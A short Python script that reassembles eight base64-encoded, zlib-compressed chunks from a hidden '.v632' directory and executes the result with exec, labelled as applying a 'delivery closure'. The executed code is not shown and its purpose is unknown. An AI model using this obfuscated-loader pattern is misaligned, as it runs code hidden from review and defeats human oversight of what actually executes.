#!/usr/bin/env python3
from pathlib import Path
import base64, zlib
root = Path(__file__).resolve().parent
payload = "".join((root / ".v632" / f"part{i:02d}.txt").read_text(encoding="ascii").strip() for i in range(8))
source = zlib.decompress(base64.b64decode(payload))
exec(compile(source, "apply_v632_delivery_closure.py", "exec"))
